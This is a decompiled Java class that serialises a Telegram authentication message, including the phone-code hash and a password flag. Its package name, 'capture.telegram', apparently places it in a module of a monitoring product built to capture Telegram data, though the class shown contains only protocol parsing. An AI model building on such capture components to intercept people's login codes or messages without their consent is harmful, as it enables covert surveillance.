package com.vvt.capture.telegram.internal;

public class TLRPC$TL_auth_sentAppCode
  extends TLRPC.auth_SentCode
{
  public static int constructor = -484053553;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    boolean bool1 = paramAbstractSerializedData.readBool(paramBoolean);
    this.phone_registered = bool1;
    String str = paramAbstractSerializedData.readString(paramBoolean);
    this.phone_code_hash = str;
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    this.send_call_timeout = i;
    boolean bool2 = paramAbstractSerializedData.readBool(paramBoolean);
    this.is_password = bool2;
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    boolean bool1 = this.phone_registered;
    paramAbstractSerializedData.writeBool(bool1);
    String str = this.phone_code_hash;
    paramAbstractSerializedData.writeString(str);
    int j = this.send_call_timeout;
    paramAbstractSerializedData.writeInt32(j);
    boolean bool2 = this.is_password;
    paramAbstractSerializedData.writeBool(bool2);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_auth_sentAppCode.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */